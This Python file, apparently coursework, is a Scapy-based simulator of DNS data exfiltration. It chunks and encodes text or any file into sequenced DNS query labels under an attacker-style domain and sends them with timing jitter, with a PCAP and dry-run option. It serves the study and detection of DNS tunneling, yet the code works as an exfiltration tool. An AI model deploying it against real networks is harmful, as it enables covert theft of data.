"""
Week 2: Scapy DNS Exfiltration Simulator
=========================================
Engine to simulate DNS data exfiltration and tunneling attacks using Scapy.
Supports data chunking, multiple encodings (Base32, Base64, Hex), multiple
DNS query types (A, TXT, AAAA, CNAME), and transmission jitter.
"""

import time
import base64
import random
import argparse
from typing import List, Optional
from pathlib import Path

# Note: Scapy is imported dynamically or at top-level with fallback
try:
    from scapy.all import IP, UDP, DNS, DNSQR, send, wrpcap
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class DNSExfiltrationSimulator:
    """Simulates DNS data exfiltration by encoding payloads into DNS query labels."""

    def __init__(
        self,
        target_domain: str = "tunnel.example.com",
        dns_server: str = "127.0.0.1",
        dns_port: int = 53,
        encoding: str = "base32",
        max_label_length: int = 63,
        delay: float = 0.2,
        jitter: float = 0.05
    ):
        self.target_domain = target_domain.strip(".")
        self.dns_server = dns_server
        self.dns_port = dns_port
        self.encoding = encoding.lower()
        self.max_label_length = min(max_label_length, 63)
        self.delay = delay
        self.jitter = jitter

        domain_labels = self.target_domain.split(".")
        if (
            not self.target_domain
            or len(self.target_domain) > 253
            or any(not label or len(label) > 63 for label in domain_labels)
        ):
            raise ValueError("target_domain must use labels of 1-63 characters and be at most 253 characters")

    def encode_payload(self, data: bytes) -> str:
        """Encode raw bytes according to selected encoding scheme."""
        if self.encoding == "base32":
            # Strip padding for cleaner DNS labels
            return base64.b32encode(data).decode("ascii").rstrip("=").lower()
        elif self.encoding == "base64":
            # DNS-safe base64: replace '+' with '-' and '/' with '_'
            b64_str = base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")
            return b64_str.lower()
        elif self.encoding == "hex":
            return data.hex().lower()
        else:
            raise ValueError(f"Unsupported encoding scheme: {self.encoding}")

    def chunk_payload(self, encoded_data: str) -> List[str]:
        """Split encoded data into DNS label chunks with sequence numbers."""
        # Each query has a sequence label, a payload label, and the target domain.
        # Keep the payload label at or below 50 characters where possible, while
        # reducing it when a long target domain would exceed the 253-char FQDN limit.
        sequence_label_length = 7  # "001-001"
        fqdn_payload_limit = 253 - len(self.target_domain) - sequence_label_length - 2
        usable_len = min(50, self.max_label_length, fqdn_payload_limit)
        if usable_len < 1:
            raise ValueError("target_domain leaves no room for a DNS payload label")

        chunks = [encoded_data[i:i + usable_len] for i in range(0, len(encoded_data), usable_len)]
        total_chunks = len(chunks)
        if total_chunks > 999:
            raise ValueError("Payload is too large for the three-digit query sequence")

        labeled_chunks = []
        for idx, chunk in enumerate(chunks, start=1):
            # Format: <seq_num>-<total>.<chunk>.<target_domain>
            labeled_chunks.append(f"{idx:03d}-{total_chunks:03d}.{chunk}")
        return labeled_chunks

    def generate_queries(self, payload: bytes) -> List[str]:
        """Generate list of Fully Qualified Domain Names (FQDNs) containing exfiltrated payload."""
        encoded = self.encode_payload(payload)
        chunks = self.chunk_payload(encoded)
        fqdns = [f"{chunk}.{self.target_domain}" for chunk in chunks]
        if any(len(fqdn.rstrip(".")) > 253 for fqdn in fqdns):
            raise ValueError("Generated DNS query exceeds the 253-character FQDN limit")
        return fqdns

    def craft_packet(self, fqdn: str, qtype: str = "A"):
        """Craft a Scapy DNS request packet."""
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is not installed. Install scapy to craft packets.")

        qtype_map = {"A": 1, "AAAA": 28, "TXT": 16, "CNAME": 5}
        qtype_num = qtype_map.get(qtype.upper(), 1)

        pkt = (
            IP(dst=self.dns_server)
            / UDP(sport=random.randint(1024, 65535), dport=self.dns_port)
            / DNS(rd=1, qd=DNSQR(qname=fqdn, qtype=qtype_num))
        )
        return pkt

    def send_queries(
        self,
        queries: List[str],
        qtype: str = "A",
        save_pcap: Optional[str] = None
    ) -> List[str]:
        """Send crafted DNS exfiltration queries to target server, optionally saving to PCAP."""
        sent_queries = []
        packets = []

        print(f"[*] Beginning exfiltration transmission: {len(queries)} queries via {qtype} records...")
        for i, fqdn in enumerate(queries, start=1):
            if SCAPY_AVAILABLE:
                pkt = self.craft_packet(fqdn, qtype=qtype)
                packets.append(pkt)
                try:
                    send(pkt, verbose=False)
                except Exception as e:
                    print(f"    [!] Error sending packet {i}: {e}")

            sent_queries.append(fqdn)
            print(f"    [{i}/{len(queries)}] Sent query: {fqdn[:45]}...")

            # Jitter delay
            sleep_time = max(0.01, self.delay + random.uniform(-self.jitter, self.jitter))
            time.sleep(sleep_time)

        if save_pcap and SCAPY_AVAILABLE and packets:
            pcap_path = Path(save_pcap)
            pcap_path.parent.mkdir(parents=True, exist_ok=True)
            wrpcap(str(pcap_path), packets)
            print(f"[+] Saved {len(packets)} packets to {pcap_path}")

        print("[+] Exfiltration simulation completed.")
        return sent_queries


def main():
    parser = argparse.ArgumentParser(description="Simulate DNS data exfiltration.")
    parser.add_argument("--domain", default="tunnel.example.com", help="Attacker controlled domain")
    parser.add_argument("--server", default="127.0.0.1", help="Target DNS server IP")
    parser.add_argument("--port", type=int, default=53, help="DNS port")
    parser.add_argument("--encoding", choices=["base32", "base64", "hex"], default="base32")
    parser.add_argument("--type", choices=["A", "TXT", "AAAA", "CNAME"], default="A", help="DNS record type")
    parser.add_argument("--text", help="Plain text string to exfiltrate")
    parser.add_argument("--file", help="File whose content to exfiltrate")
    parser.add_argument("--pcap-out", help="Save generated packets to PCAP file")
    parser.add_argument("--dry-run", action="store_true", help="Print queries without sending network packets")

    args = parser.parse_args()

    payload = b"Sample exfiltration secret data payload 1234567890."
    if args.text:
        payload = args.text.encode("utf-8")
    elif args.file:
        payload = Path(args.file).read_bytes()

    sim = DNSExfiltrationSimulator(
        target_domain=args.domain,
        dns_server=args.server,
        dns_port=args.port,
        encoding=args.encoding
    )

    queries = sim.generate_queries(payload)
    print(f"[+] Generated {len(queries)} DNS exfiltration queries.")

    if args.dry_run:
        for q in queries:
            print(f"    DRY-RUN: {q}")
    else:
        sim.send_queries(queries, qtype=args.type, save_pcap=args.pcap_out)


if __name__ == "__main__":
    main()
